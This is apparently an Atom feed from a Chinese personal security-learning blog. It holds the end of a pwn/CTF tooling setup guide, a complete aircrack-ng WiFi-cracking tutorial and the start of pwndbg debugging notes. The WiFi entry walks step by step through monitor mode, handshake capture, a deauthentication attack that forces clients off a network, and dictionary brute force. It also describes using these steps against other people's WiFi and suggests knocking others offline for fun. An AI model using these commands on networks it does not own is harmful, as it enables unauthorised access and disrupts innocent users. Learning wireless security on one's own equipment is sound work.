class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#最后，修改.gdbinit文件为如下即可</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/pwndbg/gdbinit.py</span><br><span class="line"><span class="built_in">source</span> ~/Pwngdb/pwngdb.py</span><br><span class="line"><span class="built_in">source</span> ~/angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line">import angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><img src="image-20220327155555806.png" alt="image-20220327155555806"></p><p>ok，可以开始使用pwndbg了</p><p><img src="image-20220327164455192.png" alt="image-20220327164455192"></p><br/><p>注：中间要是遇到了各种网络问题导致的文件下载失败，有以下几个解决方案</p><p>1、主机换网络（wifi、手机热点、校园网等进行切换）</p><p>2、重启虚拟机</p><p>3、主机断网一小会儿再换网络</p><p>4、重启主机 or 百度找解决方案 or 找大佬帮忙</p><br/><br/><br/><h1 id="ROPGadget-amp-one-gadget"><a href="#ROPGadget-amp-one-gadget" class="headerlink" title="ROPGadget &amp; one_gadget"></a>ROPGadget &amp; one_gadget</h1><p>参考链接：<a href="https://blingblingxuanxuan.github.io/2020/02/23/paper/#%E5%AE%89%E8%A3%85ROPGadget">ctf堆入门 - paper | Clang鱼塘 (blingblingxuanxuan.github.io)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ROPGadget</span></span><br><span class="line">$ sudo pip install capstone</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line">$ <span class="built_in">cd</span> ROPgadget</span><br><span class="line">$ sudo python3 setup.py install</span><br></pre></td></tr></table></figure><p><img src="image-20220327174130219.png" alt="image-20220327174130219"></p><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#one_gadget</span></span><br><span class="line">$ sudo apt -y install ruby</span><br><span class="line">$ sudo gem install one_gadget</span><br></pre></td></tr></table></figure><p><img src="image-20220327174311425.png" alt="image-20220327174311425"></p><p><img src="image-20220327174323894.png" alt="image-20220327174323894"></p><br/><br/><br/><h1 id="出现的问题的解决方案"><a href="#出现的问题的解决方案" class="headerlink" title="出现的问题的解决方案"></a>出现的问题的解决方案</h1><p><strong>解决ROPGadget无法使用：</strong></p><p>参考链接：<a href="https://blog.csdn.net/yongbaoii/article/details/109098446">ROPgadget 安装 错误处理 与使用_yongbaoii的博客-CSDN博客_ropgadget</a></p><p><img src="image-20220330125754796.png" alt="image-20220330125754796"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解决方案:</span></span><br><span class="line">1、找到ROPgadget下载目录，<span class="built_in">cd</span> ROPgadget进入ROPgadget目录</span><br><span class="line">2、sudo cp -r scripts &lt;报错信息中提示的路径&gt;</span><br><span class="line">3、测试是否解决完毕</span><br></pre></td></tr></table></figure><p>报错提示的路径：</p><p><img src="image-20220330130753223.png" alt="image-20220330130753223"></p><p>修复过程：</p><p><img src="image-20220330130345054.png" alt="image-20220330130345054"></p><br/><p><strong>解决exp无法执行：</strong></p><p><img src="image-20220330144406710.png" alt="image-20220330144406710"></p><p><img src="image-20220330145203291.png" alt="image-20220330145203291"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解决方案</span></span><br><span class="line">原因：字符串<span class="string">&#x27;a&#x27;</span>*112为字符串类型，p32()为byte类型</span><br><span class="line">flat使用即可（如图2），或者数据该小端序（如图3），或者在字符串前加b转换为byte类型（如图4）</span><br></pre></td></tr></table></figure><p>图1：</p><p><img src="image-20220330145102734.png" alt="image-20220330145102734"></p><p>图2：这里最后少了一个a.sendline(‘/bin/sh\x00’)，对照图3看</p><p><img src="image-20220330145131728.png" alt="image-20220330145131728"></p><p>图3：</p><p><img src="image-20220330150650501.png" alt="image-20220330150650501"></p><p>图4：</p><p><img src="image-20220330152018709.png" alt="image-20220330152018709"></p><br/><br/><br/><h1 id="32位lib库"><a href="#32位lib库" class="headerlink" title="32位lib库"></a>32位lib库</h1><p>参考链接：<a href="https://blingblingxuanxuan.github.io/2020/02/23/paper/#%E5%AE%89%E8%A3%8532%E4%BD%8Dlibc">ctf堆入门 - paper | Clang鱼塘 (blingblingxuanxuan.github.io)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一步，确认系统的架构</span></span><br><span class="line">dpkg --print-architecture  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步，确认打开了多架构支持功能</span></span><br><span class="line">dpkg --print-foreign-architectures </span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三步，安装对应的32位库  (注：这条指令我没使用)</span></span><br><span class="line">sudo apt-get dist-upgrade <span class="comment">#这一步是更新所有的软件，如果你对新版本软件的需求不是那么迫切，可以不执行 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装相关库  </span></span><br><span class="line">sudo apt-get install lib32z1</span><br><span class="line">sudo apt-get install lib32ncurses5-dev <span class="comment">#有的还需要32位stdc++库lib32stdc++6-4.8-dbg</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装gcc multilab  </span></span><br><span class="line">sudo apt-get install gcc-multilib g++-multilib  </span><br></pre></td></tr></table></figure><br/><br/><br/><h1 id="python2-7安装"><a href="#python2-7安装" class="headerlink" title="python2.7安装"></a>python2.7安装</h1><p>Ubuntu20.04自带了python3，但没有自带python2，而我们需要用到python2，所以:</p><p>原文链接：<a href="https://cloud.tencent.com/developer/article/1568626">Linux安装Python2.7 - 云+社区 - 腾讯云 (tencent.com)</a></p><p>1、下载python# wget <a href="https://www.python.org/ftp/python/2.7.9/Python-2.7.9.tgz">https://www.python.org/ftp/python/2.7.9/Python-2.7.9.tgz</a></p><p>2、解压、编译安装（依次执行以下5条命令）# tar -zxvf Python-2.7.9.tgz</p><p>cd Python-2.7.9</p><p>./configure –prefix=/usr/local/python-2.7.9</p><p>make</p><p>make install</p><p>3、系统自带了python版本，我们需要为新安装的版本添加一个软链# ln -s /usr/local/python-2.7.9/bin/python /usr/bin/python2.7</p><p>4、若需使用该版本，只需输入”python2.7.9 + 空格 + py脚本”# python2.7 ~/helloworld.py</p><p>【可选】# 假若想用python运行脚本，而不是python2.7，运行以下指令即可完成修改：</p><p>ln -s /usr/local/python-2.7.9/bin/python /usr/bin/python</p><br/><br/><br/><h1 id="LibcSearcher的安装使用"><a href="#LibcSearcher的安装使用" class="headerlink" title="LibcSearcher的安装使用"></a>LibcSearcher的安装使用</h1><p>原文链接：<a href="https://blog.csdn.net/qq_40026795/article/details/107150265">LibcSearcher的安装使用_Catch_1t_AlunX的博客-CSDN博客</a></p><p>注：这里要用到python2，在以上的python教程执行过后，执行下句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-setuptools</span><br></pre></td></tr></table></figure><p>原文链接：[python：ImportError: No module named ‘setuptools’_智商捉急网骗娘的博客-CSDN博客](<a href="https://blog.csdn.net/qq_37212752/article/details/89532388#:~:text=Python">https://blog.csdn.net/qq_37212752/article/details/89532388#:~:text=Python</a> 第三方模块中一般会自带setup.py文件，在Windows环境下，我们只需要在命令行中使用以下命令即可自动化安装 python setup.py install  ,安装的过程中有可能会出现“ ImportError%3A No module named setuptools”的错误提示，这是因为Windows环境下 Python 默认是没有安装setuptools这个模块的，这)</p><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#可以试试在windows上下好压缩包解压再复制文件夹到Ubuntu中，然后再去执行后两步</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line"><span class="built_in">cd</span> LibcSearcher</span><br><span class="line">python setup.py develop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1、进入LibcSearcher/libc-database中运行./get文件即可进行更新。</span><br><span class="line"></span><br><span class="line">2、1提到的./get无法更新时，可以到github下载lib-database源代码,git太慢可以直接浏览器下载后解压到LibcSearcher中并重命名。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> LibcSearcher</span><br><span class="line">rm -rf libc-database</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/niklasb/libc-database.git</span><br><span class="line"></span><br><span class="line">然后用./get进行libc库更新</span><br></pre></td></tr></table></figure><br/><br/><br/>]]></content>
    
    
    <summary type="html">以及pwn环境搭建</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>wifi破解</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/03/04/wifi%E7%A0%B4%E8%A7%A3/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/03/04/wifi%E7%A0%B4%E8%A7%A3/</id>
    <published>2022-03-04T14:32:01.000Z</published>
    <updated>2022-03-09T03:27:35.675Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h1><p>1、kali操作系统</p><p>2、支持监听的网卡一枚</p><p>3、手机热点（且要有人连上你的热点）</p><br/><h1 id="基本流程（简化版）"><a href="#基本流程（简化版）" class="headerlink" title="基本流程（简化版）"></a>基本流程（简化版）</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##root权限下，(su root获取root权限,ctrl+d 解除root权限)</span></span><br><span class="line"></span><br><span class="line">$ ifconfig                   <span class="comment">##检查网卡是否连接</span></span><br><span class="line">$ airmon-ng  start wlan0     <span class="comment">##设置监听模式</span></span><br><span class="line">$ airodump-ng  wlan0mon      <span class="comment">##扫描附近wifi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##监听目标流量</span></span><br><span class="line">$ airodump-ng --bssid &lt;wifi的Mac地址&gt; -c &lt;信道号&gt; -w &lt;生成文件的存储路径&gt; wlan0mon</span><br><span class="line"></span><br><span class="line"><span class="comment">##攻击指定客户端</span></span><br><span class="line">$ aireplay-ng -0 &lt;攻击次数&gt; -a &lt;wifi的Mac地址&gt; -c &lt;被攻击设备的Mac地址&gt; wlan0mon</span><br><span class="line"></span><br><span class="line"><span class="comment">##暴力破解</span></span><br><span class="line">$ aircrack-ng -w &lt;字典路径&gt; &lt;生成的.<span class="built_in">cap</span>文件路径&gt;</span><br><span class="line"></span><br><span class="line">aircrack-ng -w /usr/share/wordlists/rockyou.txt</span><br><span class="line">-----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">使用kali内置的无线密码字典，在 /usr/share/wordlists/rockyou.txt.gz，使用gzip -d rockyou.txt.gz进行解压</span><br><span class="line">使用aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 94:D9:B3:12:6F:C0 tplink-01.cap进行暴力破解</span><br></pre></td></tr></table></figure><br/><br/><h1 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h1><p>注：感觉看着吃力的话请前往重述处观看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看Aircrack-ng帮助手册--------------------------------------------------</span></span><br><span class="line">┌──(xy666㉿kali)-[~]</span><br><span class="line">└─$ aircrack-ng --<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启root权限------------------------------------------------------------</span></span><br><span class="line">┌──(xy666㉿kali)-[~]</span><br><span class="line">└─$ su root</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查网卡是否插入----------------------------------------------------------</span></span><br><span class="line">┌──(root💀kali)-[/home/xy666]</span><br><span class="line">└─<span class="comment"># ifconfig</span></span><br><span class="line"><span class="comment">#注：若能看到  wlan0:  这一项则说明网卡已插好，如 **图1**</span></span><br><span class="line"><span class="comment">#若看不到，但网卡已插（虚拟机-&gt;可移动设备-&gt;查看网卡是否连接）</span></span><br><span class="line"><span class="comment">#则可试试使用 airmon-ng  start wlan0 先开启监听</span></span><br><span class="line"><span class="comment">#再使用 ifconfig 查看网卡是否接入</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看网卡名----------------------------------------------------------------</span></span><br><span class="line">┌──(root💀kali)-[/home/xy666]</span><br><span class="line">└─<span class="comment"># iwconfig</span></span><br><span class="line"><span class="comment">#注：ifconfig -a也可查看</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置监听模式--------------------------------------------------------------</span></span><br><span class="line">┌──(root💀kali)-[/home/xy666]</span><br><span class="line">└─<span class="comment"># airmon-ng  start wlan0</span></span><br><span class="line"><span class="comment">#注：网卡开启了监听模式之后网卡的名字就变为 wlan0mon 了，以后的所有命令中的网卡名都是叫 wlan0mon</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描附近wifi-------------------------------------------------------------</span></span><br><span class="line">┌──(root💀kali)-[/home/xy666]</span><br><span class="line">└─<span class="comment"># airodump-ng  wlan0mon </span></span><br><span class="line"><span class="comment"># BSSID代表路由器的 MAC 地址</span></span><br><span class="line"><span class="comment"># PWR 代表信号的强度，数值越大代表信息越强</span></span><br><span class="line"><span class="comment"># CH 代表信道（注意）</span></span><br><span class="line"><span class="comment"># ENC代表用的加密的方式</span></span><br><span class="line"><span class="comment"># AUTH 代表认证的方式</span></span><br><span class="line"><span class="comment"># ESSID是WIFI的名字</span></span><br><span class="line"><span class="comment">#注：具体情况见 **图2**</span></span><br><span class="line"><span class="comment">#我黑的是我自己的手机热点，记住Mac地址和信道CH，之后要用到</span></span><br><span class="line"><span class="comment">#Mac地址：32:A6:EB:AD:73:6B</span></span><br><span class="line"><span class="comment">#信道：11</span></span><br><span class="line"><span class="comment">#注：ctrl+c 停止扫描wifi，不停止的话就会一直扫描，导致当前命令行不可用，</span></span><br><span class="line"><span class="comment">#但也可以新开一个命令行进行下一步操作。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 监听目标流量--------------------------------------------------------------</span></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># airodump-ng --bssid 32:A6:EB:AD:73:6B -c 11 -w /home/xy666/Desktop/wifi/ wlan0mon</span></span><br><span class="line"><span class="comment">#–bssid：指定路由器的MAC</span></span><br><span class="line"><span class="comment">#-c：指定信道</span></span><br><span class="line"><span class="comment">#-w：指定抓去握手包的存放位置或者名字，freedom是一会抓去的握手包的名字</span></span><br><span class="line"><span class="comment">#注：-w 指定生成文件的生成位置</span></span><br><span class="line"><span class="comment">#注：若监听目标流量时出现WPA handshake: 94:D9:B3:12:6F:C0表示握手包抓取成功，如 **图3**</span></span><br><span class="line"><span class="comment">#注：若很久都抓不到包，可以开启一个新的命令行攻击指定用户来加快握手包的抓取，</span></span><br><span class="line"><span class="comment">#接下一条指令 ↓，下一条指令完成后见 **图4** ，对了，同样也是ctrl+c停止监听</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击指定客户端------------------------------------------------------------</span></span><br><span class="line">┌──(root💀kali)-[/home/xy666]</span><br><span class="line">└─<span class="comment"># aireplay-ng -0 100 -a 32:A6:EB:AD:73:6B -c C4:23:60:EC:04:AF wlan0mon</span></span><br><span class="line"><span class="comment">#-0 指定攻击次数，这里设置值为100</span></span><br><span class="line"><span class="comment">#-a 表示测试WIFI的mac地址，这里指我手机热点的mac地址（牵强的解释）</span></span><br><span class="line"><span class="comment">#-c 连接至该WIFI的设备的mac地址，这里指我的攻击对象的mac地址</span></span><br><span class="line"><span class="comment">#注：这条指令过后，被攻击者的wifi就断掉了，这时只要他重连wifi，我们就能抓取到握手包了。接上一条指令 ↑</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴力破解阶段-------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#首先，新建一个字典（我用的是该方法，其他方法其自行查找别人的博客），如 **图5**</span></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment">#  aircrack-ng -w /home/xy666/桌面/kali/wifi.txt /home/xy666/Desktop/wifi/-01.cap </span></span><br><span class="line"><span class="comment">#注：aircrack-ng -w &lt;字典路径&gt; &lt;生成的.cap文件路径&gt;</span></span><br><span class="line"><span class="comment">#结果如 **图6**</span></span><br></pre></td></tr></table></figure><br/><br/><h2 id="图1："><a href="#图1：" class="headerlink" title="图1："></a>图1：</h2><p><img src="image-20220306135426910.png" alt="image-20220306135426910"></p><br/><h2 id="图2："><a href="#图2：" class="headerlink" title="图2："></a>图2：</h2><p><img src="image-20220306154550116.png" alt="image-20220306154550116"></p><br/><h2 id="图3："><a href="#图3：" class="headerlink" title="图3："></a>图3：</h2><p><img src="image-20220306154800805.png" alt="image-20220306154800805"></p><br/><h2 id="图4："><a href="#图4：" class="headerlink" title="图4："></a>图4：</h2><p>此时生成了5个文件，但我们要用到的只有那个.cap后缀的文件</p><p><img src="image-20220306151935605.png" alt="image-20220306151935605"></p><br/><h2 id="图5："><a href="#图5：" class="headerlink" title="图5："></a>图5：</h2><p>因为只是为了体验流程，所以直接把我的热点密码写进字典里了</p><p><img src="image-20220306152707770.png" alt="image-20220306152707770"></p><br/><h2 id="图6"><a href="#图6" class="headerlink" title="图6"></a>图6</h2><p>恭喜！得到wifi密码–xy6666666   ^_^</p><p><img src="image-20220306153241860.png" alt="image-20220306153241860"></p><br/><br/><h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/m0_46435741/article/details/120206498?ops_request_misc=%7B%22request_id%22:%22164639946216780366546147%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=164639946216780366546147&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120206498.es_vector_control_group&utm_term=kali%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81&spm=1018.2226.3001.4187">手把手教你如何使用kali破解wifi密码（图文教程）_m0_46435741的博客-CSDN博客_kali wifi密码</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/m0_46192523/article/details/116809814"> 破解日记 WiFi密码跑字典暴力破解 尽可能通俗易懂的版本_m0_46192523的博客-CSDN博客_wifi跑字典</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/qq_19623861/article/details/117690103">使用kali破解WIFI——Aircrack-ng_渗透测试-CSDN博客_kali 无线</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://juejin.cn/post/6844903620387815432">Kali-WIFI攻防(二)—-无线网络分析工具Aircrack-ng - 掘金 (juejin.cn)</a></p><br/><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://zhuanlan.zhihu.com/p/166178013">aircrack-ng 使用 - 知乎 (zhihu.com)</a></p><br/><br/><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>学到了一条攻击指令，有事没事可以去断断别人的网玩<br>$ aireplay-ng -0 &lt;攻击次数&gt; -a &lt;wifi的Mac地址&gt; -c &lt;被攻击设备的Mac地址&gt; wlan0mon</p><p><img src="1F22B7F7.jpg" alt="img"></p><br/><br/><h1 id="重述"><a href="#重述" class="headerlink" title="重述"></a>重述</h1><p>为了看起来不那么费劲，这里我再一步一步地对应一遍：</p><p>就用基本流程里的6步</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##root权限下，(su root获取root权限,ctrl+d 解除root权限)</span></span><br><span class="line"></span><br><span class="line">$ ifconfig                   <span class="comment">##检查网卡是否连接</span></span><br><span class="line">$ airmon-ng  start wlan0     <span class="comment">##设置监听模式</span></span><br><span class="line">$ airodump-ng  wlan0mon      <span class="comment">##扫描附近wifi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##监听目标流量</span></span><br><span class="line">$ airodump-ng --bssid &lt;wifi的Mac地址&gt; -c &lt;信道号&gt; -w &lt;生成文件的存储路径&gt; wlan0mon</span><br><span class="line"></span><br><span class="line"><span class="comment">##攻击指定客户端</span></span><br><span class="line">$ aireplay-ng -0 &lt;攻击次数&gt; -a &lt;wifi的Mac地址&gt; -c &lt;被攻击设备的Mac地址&gt; wlan0mon</span><br><span class="line"></span><br><span class="line"><span class="comment">##暴力破解</span></span><br><span class="line">$ aircrack-ng -w &lt;字典路径&gt; &lt;生成的.<span class="built_in">cap</span>文件路径&gt;</span><br></pre></td></tr></table></figure><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ifconfig                   <span class="comment">##检查网卡是否连接</span></span><br><span class="line">$ su root                    <span class="comment">##开启root权限</span></span><br></pre></td></tr></table></figure><p>可以看到，此时网卡名为wlan0</p><p><img src="image-20220306161810476.png" alt="image-20220306161810476"></p><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airmon-ng  start wlan0     <span class="comment">##设置监听模式</span></span><br></pre></td></tr></table></figure><p>设置监听过后，可以看到我们的网卡名变成了wlan0mon</p><p><img src="image-20220306162422299.png" alt="image-20220306162422299"></p><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airodump-ng  wlan0mon      <span class="comment">##扫描附近wifi</span></span><br></pre></td></tr></table></figure><p>不知道为什么中间空了一大段</p><p><img src="image-20220306162657603.png" alt="image-20220306162657603"></p><p>Mac：32:A6:EB:AD:73:6B  信道：11</p><p><img src="image-20220306162816968.png" alt="image-20220306162816968"></p><p>注：ctrl+c 停止扫描</p><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##监听目标流量</span></span><br><span class="line">$ airodump-ng --bssid &lt;wifi的Mac地址&gt; -c &lt;信道号&gt; -w &lt;生成文件的存储路径&gt; wlan0mon</span><br></pre></td></tr></table></figure><p>检测到三个连接我热点的设备</p><p><img src="image-20220306163144205.png" alt="image-20220306163144205"></p><p>实际上也的确有三个设备连接着我的热点</p><p><img src="image-20220306163230059.png" alt="image-20220306163230059"></p><p>此时叫一个小伙伴断网重连我的热点，便抓取到了握手数据包，如下：</p><p><img src="image-20220306163446243.png" alt="image-20220306163446243"></p><p>当然，如果是破解别人的wifi，可以利用下一条指令踢掉一个WiFi用户，等被踢用户重新连接wifi的时候我们便可以抓取到握手数据包。</p><p>ctrl+c 停止监听：</p><p><img src="image-20220306163844323.png" alt="image-20220306163844323"></p><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##攻击指定客户端</span></span><br><span class="line">$ aireplay-ng -0 &lt;攻击次数&gt; -a &lt;wifi的Mac地址&gt; -c &lt;被攻击设备的Mac地址&gt; wlan0mon</span><br></pre></td></tr></table></figure><p>这里就不列图了。1、懒；2、还是因为懒</p><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##暴力破解</span></span><br><span class="line">$ aircrack-ng -w &lt;字典路径&gt; &lt;生成的.<span class="built_in">cap</span>文件路径&gt;</span><br></pre></td></tr></table></figure><p>首先，查看文件是否生成（生成了）：</p><p><img src="image-20220306164103787.png" alt="image-20220306164103787"></p><p>那么，开始破解（得到密码：xy6666666）：</p><p><img src="image-20220306164410424.png" alt="image-20220306164410424"></p><br/><br/>]]></content>
    
    
    <summary type="html">初探</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>PWN</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/02/17/PWN/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/02/17/PWN/</id>
    <published>2022-02-17T08:00:39.000Z</published>
    <updated>2022-05-20T15:25:05.076Z</updated>
    
    <content type="html"><![CDATA[<h1 id="esp"><a href="#esp" class="headerlink" title="esp"></a>esp</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#总记不住，但又常需要看，所以放到这里</span><br><span class="line">push    #先减esp，再压入</span><br><span class="line">pop     #先取数据再增esp</span><br></pre></td></tr></table></figure><br/><br/><h1 id="pwndbg调试指令记录"><a href="#pwndbg调试指令记录" class="headerlink" title="pwndbg调试指令记录"></a>pwndbg调试指令记录</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#常用的</span></span><br><span class="line">pwndbg&gt; b main      <span class="comment">#break   ，main函数下断点</span></span><br><span class="line">pwndbg&gt; r           <span class="comment">#run     ，运行程序，其会自动在第一个断点处暂停执行</span></span><br><span class="line">pwndbg&gt; ni          <span class="comment">#next    ，单步执行，不进入函数体</span></span><br><span class="line">pwndbg&gt; si          <span class="comment">#step    ，单步执行，进入函数内部</span></span><br><span class="line">pwndbg&gt; p           <span class="comment">#print   ，打印指定变量的值。例：p &amp;buf2，查找buf2的存储地址，</span></span><br><span class="line">pwndbg&gt; vmmap       <span class="comment">#查看当前程序的系统调用库，常用来查看可执行段位置</span></span><br><span class="line">pwndbg&gt; cyclic 200  <span class="comment">#按一定的规则生成200个字符串</span></span><br><span class="line">pwndbg&gt; cyclic -l &lt;数据&gt;     <span class="comment"># 查询&lt;数据&gt;在生成的字符串中的位置，&lt;数据&gt;例子：0x62616164</span></span><br><span class="line">pwndbg&gt; b *&lt;地址&gt;            <span class="comment"># 